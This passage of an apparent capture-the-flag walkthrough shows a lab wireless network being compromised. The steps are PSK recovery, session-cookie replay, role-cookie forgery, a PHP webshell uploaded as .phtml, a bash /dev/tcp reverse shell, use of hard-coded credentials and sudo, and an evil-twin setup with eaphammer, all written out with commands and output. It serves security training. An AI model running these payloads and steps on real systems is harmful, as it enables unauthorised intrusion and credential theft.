      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0
                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 7F 7F E6 5F 60 0B 9C 6B D8 C4 B8 86 AC 2F 88 F4
```

The password for AirTouch-Internet is “challenge”.

### Connect

With the password and wireless interfaces, I’ll connect to AirTouch-Internet. `wpa_passphrase` will create the config:

```console
root@AirTouch-Consultant:~# wpa_passphrase AirTouch-Internet 'challenge' > /tmp/airtouch-internet.conf
root@AirTouch-Consultant:~# cat /tmp/airtouch-internet.conf
network={
        ssid="AirTouch-Internet"
        #psk="challenge"
        psk=d1ff702dcb1182eec9e189e1693555a007dc1b21be358e02b87574497dcf017e
}
```

Then `wpa_supplicant` will connect:

```console
root@AirTouch-Consultant:~# wpa_supplicant -B -i wlan2 -c /tmp/airtouch-internet.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

I’m using `wlan2` because it’s clean, I haven’t messed with it yet. This brings up the interface, but it doesn’t have an IP yet:

```console
root@AirTouch-Consultant:~# ip addr show wlan2
9: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::ff:fe00:200/64 scope link
       valid_lft forever preferred_lft forever
```

`dhclient` will kick-off the DHCP process to get one:

```console
root@AirTouch-Consultant:~# dhclient -v wlan2
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan2/02:00:00:00:02:00
Sending on   LPF/wlan2/02:00:00:00:02:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0xadc90477)
DHCPOFFER of 192.168.3.84 from 192.168.3.1
DHCPREQUEST for 192.168.3.84 on wlan2 to 255.255.255.255 port 67 (xid=0x7704c9ad)
DHCPACK of 192.168.3.84 from 192.168.3.1 (xid=0xadc90477)
bound to 192.168.3.84 -- renewal in 36119 seconds.
root@AirTouch-Consultant:~# ip addr show wlan2
9: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.84/24 brd 192.168.3.255 scope global dynamic wlan2
       valid_lft 86165sec preferred_lft 86165sec
    inet6 fe80::ff:fe00:200/64 scope link
       valid_lft forever preferred_lft forever
```

I’ve got an IP address on AirTouch-Internet as 192.168.3.84, which is in the expected range based on the diagram. On a reset this IP will likely be different, but in the same subnet.

## Shell as www-data@AirTouch-AP-PSK

### Network Enumeration

Unfortunately, `ping` is not installed on the consultant laptop, but `nmap` is. I’ll run with the default top ports over the entire class-C network:

```console
root@AirTouch-Consultant:~# nmap 192.168.3.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:44 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)

Nmap scan report for 192.168.3.84
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (2 hosts up) scanned in 26.27 seconds
```

I’ll get a more complete scan on 192.168.3.1:

```console
root@AirTouch-Consultant:~# nmap -p- --min-rate 10000 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:53 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000015s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)

Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds
root@AirTouch-Consultant:~# nmap -p 22,53,80 -sCV 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:54 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: WiFi Router Configuration
|_Requested resource was login.php
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds
```

I’ll get a tunnel through to this machine reconnecting `ssh` with `-D 1080`. I like to configure Burp so that I can have my browser send through Burp and then Burp through the SSH proxy:

![image-20260412081238399](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412081238399.png)

I’ll just want to reset this when I’m done.

### PSK Router - TCP 80

#### Site

The website on port 80 redirects to `/login.php`, which presents a login form:

![image-20260412081647913](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412081647913.png)

Any credentials I guess return an error:

![image-20260412081621495](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412081621495.png)

#### Tech Stack

The HTTP response headers show that the page is hosted by Apache:

```http
HTTP/1.1 302 Found
Date: Sun, 12 Apr 2026 12:18:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

The 404 page is the [default Apache 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd):

![image-20260412081937904](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412081937904.png)

Clearly the site is PHP based on the file extension.

#### Directory Brute Force

I’ll use `feroxbuster` with the `--proxy` option to brute force paths on this webserver:

```console
oxdf@hacky$ feroxbuster -u http://192.168.3.1 -x php --proxy socks5://127.0.0.1:1080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.3.1
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💎  Proxy                 │ socks5://127.0.0.1:1080
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://192.168.3.1/ => login.php
301      GET        9l       28w      312c http://192.168.3.1/uploads => http://192.168.3.1/uploads/
302      GET        0l        0w        0c http://192.168.3.1/index.php => login.php
200      GET       87l      161w     1325c http://192.168.3.1/style.css
200      GET       40l       67w      907c http://192.168.3.1/login.php
302      GET        0l        0w        0c http://192.168.3.1/lab.php => login.php
[####################] - 62s    60003/60003   0s      found:6       errors:1
[####################] - 59s    30000/30000   505/s   http://192.168.3.1/
[####################] - 59s    30000/30000   505/s   http://192.168.3.1/uploads/
```

`/uploads` is interesting. The 301 redirect to `/uploads/` is normal behavior for a directory, but visiting the trailing-slash path returns 403 Forbidden — directory listing is disabled. Files inside could still be accessible if I know their names.

### Recover Session Cookie

#### Enter PSK

I was able to recover the PSK for the WPA2 encryption in the capture from earlier. I can use that to look at the traffic on the network in WireShark. The key needs to be entered under Edit –> Preferences –> Protocols –> IEEE 802.11:

![image-20260412101345043](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412101345043.png)

The Decryption keys “Edit…” button loads a dialog:

![image-20260412101416902](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412101416902.png)

#### HTTP Session

If I filter in WireShark for `http`, two packets come back:

[![image-20260412101529583](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412101529583.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412101529583.png)

It’s a GET request for `/lab.php` and the response. I’ll follow the TCP stream:

![image-20260412101620877](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412101620877.png)

There’s a session cookie as well as a `UserRole` cookie.

### Website Access

#### User

I’ll update my `PHPSESSID` cookie in Firefox dev tools:

![image-20260412102229504](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412102229504.png)

Now on loading `/` it doesn’t redirect to `/login.php`:

![image-20260412102300586](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412102300586.png)

I’ll note that the page looks a little off. There’s no text inside the “()”, and an empty div at the bottom. If I add the `UserRole` cookie:

![image-20260412102410104](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412102410104.png)

The top is modified:

![image-20260412102423028](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412102423028.png)

I can set it to whatever I want, and that’s reflected in the page:

![image-20260412102455424](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412102455424.png)

Role enforcement here is entirely client-side. The server trusts whatever `UserRole` value the browser sends without validating it against the session, so any privileged functionality gated only on this cookie is reachable just by changing it.

#### Admin Access

When I change the `UserRole` value to “admin”, not only does the welcome message update, but there’s now an upload feature in the bottom div:

![image-20260412144646789](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412144646789.png)

I’ll make a simple `.json` file:

```json
{ "test": "hello" }
```

On uploading it, it points to the `/uploads/` directory:

![image-20260412144828213](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412144828213.png)

I still can’t access `/uploads/`, but I can access `/uploads/test.json` (using `proxychains` to use the SSH proxy):

```console
oxdf@hacky$ proxychains curl http://192.168.3.1/uploads/test.json
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
{ "test": "hello" }
```

### Shell

#### Webshell

I’ll create a simple PHP webshell, `0xdf.php`:

```php
<?php

system($_REQUEST['cmd']);

?>
```

On trying to upload it, the site rejects it:

![image-20260412145054831](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412145054831.png)

There are other [file extensions that typically are handled as PHP](https://www.studyhost.net/support/knowledgebase/53/What-are-valid-file-extensions-I-can-use-for-PHP-scripts.html). `.php3`, `.php4`, and `.php5` are all blocked, but `.phtml` works:

![image-20260412145247353](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260412145247353.png)

And it works:

```console
oxdf@hacky$ proxychains curl http://192.168.3.1/uploads/0xdf.phtml -d 'cmd=id'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reverse Shell

I’m not able to get any kind of traffic from 192.168.3.1 back to my host. No HTTP, ping, or reverse shell. But, when I start `nc` listening on the consultant machine, I can get a reverse shell there:

```console
oxdf@hacky$ proxychains curl http://192.168.3.1/uploads/0xdf.phtml --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.3.84/443 0>&1"'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
```

That just hangs, but at `nc`:

```console
root@AirTouch-Consultant:~# nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.3.1 40112
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@AirTouch-AP-PSK:/var/www/html/uploads$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@AirTouch-Consultant:~# stty raw -echo ; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@AirTouch-AP-PSK:/var/www/html/uploads$
```

## Shell as root@AirTouch-AP-PSK

### Enumeration

#### Website

The website PHP is held in `/var/www/html`:

```console
www-data@AirTouch-AP-PSK:/var/www/html$ ls
index.php  lab.php  login.php  logout.phtml  style.css  uploads
```

`login.php` has hard-coded creds:

```php
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
  );
```

The user user is commented out. Then it checks the input and sets the `UserRole` cookie:

```php
  /* Check and assign submitted Username and Password to new variable */
  $Username = isset($_POST['Username']) ? $_POST['Username'] : '';
  $Password = isset($_POST['Password']) ? $_POST['Password'] : '';

  /* Check Username and Password existence in defined array */
  if (isset($logins[$Username]) && $logins[$Username]['password'] === $Password) {
    /* Success: Set session variables and redirect to Protected page  */
    $_SESSION['UserData']['Username'] = $logins[$Username]['password'];
    /* Success: Set session variables USERNAME  */
    $_SESSION['Username'] = $Username;

    // Set a cookie with the user's role
    setcookie('UserRole', $logins[$Username]['role'], time() + (86400 * 30), "/"); // 86400 = 1 day

    header("location:index.php");
    exit;
  } else {
    /*Unsuccessful attempt: Set error message */
    $msg = "<span style='color:red'>Invalid Login Details</span>";
  }
}

?>
```

The `PHPSESSID` is managed by PHP, and the values stored in `$_SESSION` reflect that.

#### Users

There’s one user in `/home`:

```console
www-data@AirTouch-AP-PSK:/home$ ls
user
```

This lines up with users with shells set in `passwd`:

```console
www-data@AirTouch-AP-PSK:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
```

www-data isn’t able to read anything from that directory.

Trying to run `sudo -l` requests a password that I don’t have.

### su / SSH as user

The commented PHP has a password for the user user, so I’ll try it on the system with `su`, and it works:

```console
www-data@AirTouch-AP-PSK:/$ su user -
Password:
user@AirTouch-AP-PSK:/$
```

It also works over SSH using proxychains (or from the consultant shell):

```console
oxdf@hacky$ proxychains sshpass -p JunDRDZKHDnpkpDDvay ssh user@192.168.3.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
user@AirTouch-AP-PSK:~$
```

### sudo

The user user can run any command as any user without a password using `sudo`:

```console
user@AirTouch-AP-PSK:~$ sudo -l
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

`sudo -i` returns a root shell:

```console
user@AirTouch-AP-PSK:~$ sudo -i
root@AirTouch-AP-PSK:~#
```

I’ll grab `user.txt`:

```console
root@AirTouch-AP-PSK:~# cat user.txt
9fd9619b************************
```

## Shell as remote@AirTouch-AP-MGT

### Enumeration

#### Home Directories

`/root` has a bunch of stuff:

```console
root@AirTouch-AP-PSK:~# ls -la
total 44
drwx------ 1 root root 4096 Apr 10 19:04 .
drwxr-xr-x 1 root root 4096 Apr 10 19:04 ..
lrwxrwxrwx 1 root root    9 Nov 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Mar 27  2024 certs-backup
-rwxr-xr-x 1 root root    0 Mar 27  2024 cronAPs.sh
drwxr-xr-x 1 root root 4096 Apr 10 19:04 psk
-rw-r--r-- 1 root root  364 Nov 24  2024 send_certs.sh
-rwxr-xr-x 1 root root 1963 Mar 27  2024 start.sh
-rw-r----- 1 root 1001   33 Apr 10 19:04 user.txt
-rw-r--r-- 1 root root  319 Mar 27  2024 wlan_config_aps
```

`start.sh`

```bash
#!/bin/bash

echo start.sh

# TODO move to Dockerfile
envsubst_tmp (){
    for F in ./*.tmp ; do
        #DO it only first time
        if [ "$F" != '/*.tmp' ]; then
            #echo $F
            NEW=`basename $F .tmp`
            envsubst < $F > $NEW
            rm $F 2> /dev/nil
        fi
    done
}

chown user:user /home/user/user.txt
chmod +r /var/www/certs/ -R

#LOAD VARIABLES FROM FILE (EXPORT)
set -a
source /root/wlan_config_aps

envsubst < /etc/dnsmasq.conf.tmp > /etc/dnsmasq.conf

# Replace var in config AP files
#PSK
cd /root/psk/
envsubst_tmp

cd

date

echo 'nameserver 8.8.8.8' > /etc/resolv.conf

# Wlan first 6 for attacker, next 14 for AP, rest for client

mkdir /var/log/ 2> /dev/nil

#F0:9F:C2:71 ubiquiti
macchanger -m $MAC_PSK $WLAN_PSK >> /var/log/macchanger.log # PSK

macchanger -r $WLAN_OTHER0  >> /var/log/macchanger.log # Other 0
macchanger -r $WLAN_OTHER1 >> /var/log/macchanger.log # Other 1
macchanger -r $WLAN_OTHER2 >> /var/log/macchanger.log # Other 2
macchanger -r $WLAN_OTHER3 >> /var/log/macchanger.log # Other 3

bash /root/cronAPs.sh > /var/log/cronAPs.log 2>&1 &

dnsmasq

#TODO RE ORDER ALL WLAN and IP -> 0 OPN, 1 WEP, 2 PSK, 3 PSK WPS, 4 MGT, 5 MGTRelay, 6 MGT TLS, 7 8 , 9,10,11,12,13 others

# PSK
ip addr add $IP_PSK.1/24 dev $WLAN_PSK
hostapd_aps /root/psk/hostapd_wpa.conf > /var/log/hostapd_wpa.log &

#TODO
#ip addr add $IP_8.1/24 dev $WLAN_MGTTLS

# PSK Other
ip addr add $IP_OTHER0.1/24 dev $WLAN_OTHER0
hostapd_aps /root/psk/hostapd_other0.conf > /var/log/hostapd_other0.log &

ip addr add $IP_OTHER1.1/24 dev $WLAN_OTHER1
hostapd_aps /root/psk/hostapd_other1.conf > /var/log/hostapd_other1.log &

ip addr add $IP_OTHER2.1/24 dev $WLAN_OTHER2
hostapd_aps /root/psk/hostapd_other2.conf > /var/log/hostapd_other2.log &

ip addr add $IP_OTHER3.1/24 dev $WLAN_OTHER3
hostapd_aps /root/psk/hostapd_other3.conf > /var/log/hostapd_other3.log &

#systemctl stop networking
echo "ALL SET"

/bin/bash
```

This script is responsible for:

- Launching the AirTouch-Internet, as well as the out of scope APs.
- Using `macchanger` to set the MAC addresses of the APs. AirTouch-Internet is set to the specific Ubiquiti MAC, and the rest are randomized using `-r`.

`send_certs.sh` copies the files from `/root/certs-backup` to 10.10.10.1 using `scp`:

```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office.

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

10.10.10.1 is the AirTouch-Office gateway, and it has the user remote with the password “xGgWEwqUpfoOVsLeROeG”. Unfortunately, this box doesn’t have an interface on the 10.10.10.0/24 network, so SSH fails:

```console
root@AirTouch-AP-PSK:~# ssh remote@10.10.10.1
ssh: connect to host 10.10.10.1 port 22: Network is unreachable
root@AirTouch-AP-PSK:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
14: wlan7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether f0:9f:c2:a3:f1:a7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.1/24 scope global wlan7
       valid_lft forever preferred_lft forever
    inet6 fe80::f29f:c2ff:fea3:f1a7/64 scope link
       valid_lft forever preferred_lft forever
15: wlan8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 3e:16:e6:e4:3c:72 brd ff:ff:ff:ff:ff:ff
    inet 192.168.4.1/24 scope global wlan8
       valid_lft forever preferred_lft forever
    inet6 fe80::3c16:e6ff:fee4:3c72/64 scope link
       valid_lft forever preferred_lft forever
16: wlan9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 92:52:98:67:66:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.5.1/24 scope global wlan9
       valid_lft forever preferred_lft forever
    inet6 fe80::9052:98ff:fe67:6619/64 scope link
       valid_lft forever preferred_lft forever
17: wlan10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 8a:68:3a:d6:eb:29 brd ff:ff:ff:ff:ff:ff
    inet 192.168.6.1/24 scope global wlan10
       valid_lft forever preferred_lft forever
    inet6 fe80::8868:3aff:fed6:eb29/64 scope link
       valid_lft forever preferred_lft forever
18: wlan11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether f2:2a:26:a4:0b:29 brd ff:ff:ff:ff:ff:ff
    inet 192.168.7.1/24 scope global wlan11
       valid_lft forever preferred_lft forever
    inet6 fe80::f02a:26ff:fea4:b29/64 scope link
       valid_lft forever preferred_lft forever
```

`certs-backup` has the CA and server certificates:

```console
root@AirTouch-AP-PSK:~# ls certs-backup/
ca.conf  ca.crt  server.conf  server.crt  server.csr  server.ext  server.key
```

`ca.key` is missing. With that, I could sign my own client cert and authenticate to the access point.

### Recover Password w/ Evil Twin

#### Strategy

With the CA certificate (`ca.crt`) and the server’s certificate (`server.crt`) and key (`server.key`), I can stand up a legitimate looking evil twin of AirTouch-Office and capture the authentication flow. Without this cryptographic material, the client won’t get far enough in a connection to reveal anything.

At this point, I don’t know the exact configuration for the network and how it’s handling authentication. Some possible algorithms:

- EAP-TLS: Mutual auth requires the client to have its own certificate + private key. The client presents its cert (which can be captured) but proves possession of the private key without sending it. So evil twin reveals client identities and cert chains, but without the private key you can’t use that cert to authenticate yourself, leaving the attack with recon value only.
- PEAP-MSCHAPv2 or EAP-TTLS-MSCHAPv2: In these cases, the client sends a challenge/response inside the TLS tunnel that can be dumped and cracked offline to recover a user’s password.
- PEAP-GTC / TTLS-PAP: Here the user’s plaintext password is sent over a TLS tunnel.

If either of the latter methods are in use, I can get authentication material. I could do monitoring on the AirTouch-Office channel to identify the algorithm, but it’s just as fast to just do the Evil Twin attack and see what comes back.

#### Collect Data

To start the attack, I’ll need some data. I’ll copy the certificate information from AirTouch-AP-PSK over to the consultant box:

```console
root@AirTouch-AP-PSK:~# scp certs-backup/* consultant@192.168.3.84:~/
The authenticity of host '192.168.3.84 (192.168.3.84)' can't be established.
ECDSA key fingerprint is SHA256:RNSulmHvYvAQ2qGrTB9aiv48odVoupHVDFEeI6PS4j0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.3.84' (ECDSA) to the list of known hosts.
consultant@192.168.3.84's password:
ca.conf                                        100% 1124   229.7KB/s   00:00
ca.crt                                         100% 1712     1.8MB/s   00:00
server.conf                                    100% 1111   563.3KB/s   00:00
server.crt                                     100% 1493     1.6MB/s   00:00
server.csr                                     100% 1033   712.4KB/s   00:00
server.ext                                     100%  168   131.5KB/s   00:00
server.key                                     100% 1704     2.8MB/s   00:00
```

I’ll import those into `eaphammer` using the `--cert-wizard` option:

```console
root@AirTouch-Consultant:~/eaphammer# ./eaphammer --cert-wizard import --server-cert /home/consultant/server.crt --ca-cert /home/consultant/ca.crt --private-key /home/consultant/server.key

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
/home/consultant/server.crt
/home/consultant/server.key
/home/consultant/ca.crt
[CW] Complete!
[CW] Loading private key from /home/consultant/server.key
[CW] Complete!
[CW] Loading server cert from /home/consultant/server.crt
[CW] Complete!
[CW] Loading CA certificate chain from /home/consultant/ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

I’ll also need to know the channel and MAC addresses of the `AirTouch-Office` APs, which I collected earlier:

```console
root@AirTouch-Consultant:/# iwlist wlan0 scan | grep -e ESSID -e Frequency -e Address
...[snip]...
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
```

Both are on channel 44, and there are two distinct MACs.

#### Capture Challenge Response

I’ll start `eaphammer` on a previously unused interface impersonating `AirTouch-Office`:

```console
root@AirTouch-Consultant:~/eaphammer# ./eaphammer -i wlan4 --auth wpa-eap --essid AirTouch-Office

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan4...

100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan4 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-04-12-20-50-49-AYtRAd9tEFIzZMAhvq7SJX5865RvbB0x.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-04-12-20-50-49-UBlBLJgkx1dljXQQHbkeoVZnIGUxBBlQ.conf
rfkill: Cannot open RFKILL control device
wlan4: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan4 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan4: interface state COUNTRY_UPDATE->ENABLED
wlan4: AP-ENABLED

Press enter to quit...
```

It hangs, waiting for an authentication attempt. In another shell, I’ll use a new interface in monitoring mode to send deauth messages to both APs:

```console
root@AirTouch-Consultant:~# iw dev wlan5 set type monitor
root@AirTouch-Consultant:~# ip link set wlan5 up
root@AirTouch-Consultant:~# iw dev wlan5 set channel 44
